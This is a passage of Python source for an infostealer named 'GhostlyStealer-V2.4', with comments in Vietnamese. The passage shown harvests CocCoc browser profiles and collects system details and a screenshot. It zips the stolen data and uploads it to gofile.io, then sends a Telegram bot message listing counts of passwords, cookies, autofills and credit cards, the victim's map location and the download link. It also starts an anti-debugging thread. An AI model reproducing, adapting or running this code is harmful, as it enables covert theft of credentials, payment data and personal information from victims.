        [f"{local}/CocCoc/Browser/User Data",                       "browser.exe",      "/Profile 9/Local Storage/leveldb",   "/Profile 9/", "/Profile 9/Network",     "/Profile 9/Local Extension Settings/"          ],
        [f"{local}/CocCoc/Browser/User Data",                       "browser.exe",      "/Profile 10/Local Storage/leveldb",  "/Profile 10/","/Profile 10/Network",     "/Profile 10/Local Extension Settings/"        ]

    ]
    process_browser_paths(browserPaths)
    process_cookies(browserPaths)
    gather_system_info()
def get_mac_address():
    for interface, addrs in psutil.net_if_addrs().items():
        if interface == "Wi-Fi":
            for addr in addrs:
                if addr.family == psutil.AF_LINK:
                    mac = addr.address
                    return mac

def machineinfo():
    totalMemory = subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()
    totalMemory = (str(int(int(totalMemory[1])/1000000000)) + " GB") if len(totalMemory) >= 1 else "Unable to detect total memory"
    c = wmi.WMI()
    for gpu in c.Win32_DisplayConfiguration():
        GPUm = gpu.Description.strip()

    current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()     
    mac = get_mac_address()
    result = f"💻Username: {username.upper()}\n💻Ram: {totalMemory}\n💻GPU: {GPUm}\n💻Mac: {mac}\n💻UID: {current_machine_id}\n"
    return result
def capture():
    temp_photo_path = os.path.join(temp, "screenshot.png")
    with mss.mss() as sct:
        # Chụp màn hình đầy đủ
        screenshot = sct.grab(sct.monitors[0])

        # Lưu hình ảnh
        tools.to_png(screenshot.rgb, screenshot.size, output=temp_photo_path)
    
    # Di chuyển hình ảnh đến thư mục đích với tên tệp tùy chỉnh
    destination_path = os.path.join(temp, f"{contryCode}_Ghostly_{username}")
    shutil.move(temp_photo_path, destination_path)

    # Xóa tệp hình ảnh tạm sau khi đã sử dụng
    try:
        os.remove(temp_photo_path)
    except FileNotFoundError:
        pass
capture()
def upload_to_gofile(zip_file_name):
    try:
        server_response = requests.get("https://api.gofile.io/getServer").json()
        server = server_response["data"]["server"]
        with open(zip_file_name, 'rb') as file:
            response = requests.post(f'https://{server}.gofile.io/uploadFile', files={'file': file})
        if response.status_code == 200:
            download_page_url = response.json()["data"]["downloadPage"]
            return download_page_url
        else:
            return None
    except Exception as e:
        return None

def send_telegram_message(download_link):
    try:
        Ip = getip()
        api_key = '21DA3C31774AD4821B0A69362DC07ACB'

        # URL API
        url = f'https://api.ip2location.io/?key={api_key}&ip={Ip}'

        # Gửi yêu cầu GET đến API
        response = requests.get(url)

        if response.status_code == 200:
            data = response.json()
            latitude= data.get('latitude')
            longitude = data.get('longitude')
    except Exception:
        latitude, longitude = "Unknown", "Unknown"
    
    text = f"""
    ```GhostlyStealer-V2.4
{globalInfo()}{machineinfo()}🌐Passwords Found: {PassCount}\n🌐Cookies Found: {CookiCount}\n🌐Histories Found: {Hiscount}\n🌐Autofills Found: {AutofillCount}\n🌐CreditCards Found: {CreCount}\n📍Google Map: https://www.google.com/maps/search/google+map+{latitude},{longitude}\n📁Download: {download_link}
    ```"""
    bot.send_message(chat_id=chat_id, text=text, parse_mode="Markdown")
    
def main():
    functions = [antidebug, GatherAll]
    threads = [threading.Thread(target=func) for func in functions]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    
    folder_path = os.path.join(temp, f"{contryCode}_Ghostly_"+username)
    zip_file_name = os.path.join(local, f"{contryCode}_Ghostly_"+username)
    shutil.make_archive(zip_file_name, 'zip', folder_path)
    shutil.rmtree(folder_path)
    
    zip_file_path = f"{zip_file_name}.zip"
    download_link = upload_to_gofile(zip_file_path)
    if download_link:
        send_telegram_message(download_link)
    os.remove(zip_file_path)

if __name__ == "__main__":
    main()

